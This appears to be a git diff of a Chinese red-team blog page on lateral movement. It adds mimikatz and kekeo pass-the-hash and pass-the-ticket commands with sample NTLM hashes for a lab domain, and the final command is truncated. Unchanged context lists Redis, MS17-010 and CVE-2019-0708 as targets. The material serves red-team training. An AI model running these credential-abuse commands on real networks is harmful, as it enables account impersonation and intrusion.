@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="横向移动上一章是说明了如何定位域控和域管账号，在红蓝对抗中我们不完全是要攻击域控，同样也要攻击一些核心服务器之类拿到重要数据，这样更容易在比赛中刷分和比较清楚的证明危害。一般内网中的核心主要是财务系统、OA、客户数据等系统。我们通过横向攻击拿到这些数据也能在与比赛和项目中取得好的成果。 服务探测和常见漏洞利用主机发现这里主要是通过C段、B段的扫描来获取有哪些主机， 根据条件使用全端口、敏感端口。这">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-08-31T10:00:56.862Z">
+<meta property="og:updated_time" content="2020-10-24T05:40:31.138Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="红蓝之横向移动">
 <meta name="twitter:description" content="横向移动上一章是说明了如何定位域控和域管账号，在红蓝对抗中我们不完全是要攻击域控，同样也要攻击一些核心服务器之类拿到重要数据，这样更容易在比赛中刷分和比较清楚的证明危害。一般内网中的核心主要是财务系统、OA、客户数据等系统。我们通过横向攻击拿到这些数据也能在与比赛和项目中取得好的成果。 服务探测和常见漏洞利用主机发现这里主要是通过C段、B段的扫描来获取有哪些主机， 根据条件使用全端口、敏感端口。这">
@@ -186,6 +186,11 @@ ga('send', 'pageview');
       
 
       
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/内网/">内网</a>
+  </span>
+
 
 
       
@@ -214,7 +219,13 @@ ga('send', 'pageview');
 <h2 id="域横向移动手段"><a href="#域横向移动手段" class="headerlink" title="域横向移动手段"></a>域横向移动手段</h2><h3 id="IPC管道"><a href="#IPC管道" class="headerlink" title="IPC管道"></a>IPC管道</h3><p>net use 可以查看当前ipc连接，通过ipc可以直接执行命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure>
 
-<h3 id="PTH-amp-amp-PTT"><a href="#PTH-amp-amp-PTT" class="headerlink" title="PTH&amp;&amp;PTT"></a>PTH&amp;&amp;PTT</h3><p>先了解Kerberos协议和ntlm认证，这两种方式总得来说就是得到了域控或者成员的hash，而hash在内网中作为了认证的密钥，得到了hash就可以伪造成对应的身份，详细<a href="https://www.cnblogs.com/bmjoker/p/10723432.html" target="_blank" rel="noopener">协议机制</a></p>
+<h3 id="PTH-amp-amp-PTT"><a href="#PTH-amp-amp-PTT" class="headerlink" title="PTH&amp;&amp;PTT"></a>PTH&amp;&amp;PTT</h3><p>先了解Kerberos协议和ntlm认证，这两种方式总得来说就是得到了域控或者成员的hash，而hash在内网中作为了认证的密钥，得到了hash就可以伪造成对应的身份，详细<a href="https://www.cnblogs.com/bmjoker/p/10723432.html" target="_blank" rel="noopener">协议机制</a>。</p>
+<p><strong>PTH</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"></span><br><span class="line">kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br><span class="line">kekeo &quot;kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>PTK</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:mary /domain:god.org /aes256:c4388a1fb9bd65a88343a32c09e53</span><br></pre></td></tr></table></figure>
+
 <h2 id="工作组横向移动手段"><a href="#工作组横向移动手段" class="headerlink" title="工作组横向移动手段"></a>工作组横向移动手段</h2><p>工作组就和普通外网的一样，而且能看到的端口更多，利用常见漏洞、相同密码、窃听手段来渗透。</p>
 <h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis未授权 常见端口6379 16379 26379</span><br><span class="line">ms17-010</span><br><span class="line">cve-2019-0708</span><br></pre></td></tr></table></figure>
 
@@ -232,7 +243,7 @@ ga('send', 'pageview');
     <a class="show pull-left" href="/2020/07/09/红蓝之隧道搭建与主机信息搜集/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2020/08/29/powershell学习/">
+    <a class="show pull-right" href="/2020/08/31/Fastjson历史漏洞分析/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
